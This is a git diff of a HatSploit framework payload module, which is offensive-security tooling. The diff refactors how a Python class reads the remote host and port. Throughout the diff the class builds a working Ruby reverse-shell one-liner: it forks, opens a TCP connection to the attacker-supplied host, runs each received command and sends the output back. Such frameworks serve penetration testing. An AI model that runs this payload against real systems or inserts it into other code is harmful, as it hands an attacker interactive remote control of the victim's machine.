@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 
 
 class HatSploitPayload(Payload):
@@ -24,14 +24,11 @@ class HatSploitPayload(Payload):
         }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
-
         payload = (
                 "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""
-                + remote_host
+                + self.rhost.value
                 + "\",\""
-                + remote_port
+                + self.rport.value
                 + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
         )
         return payload
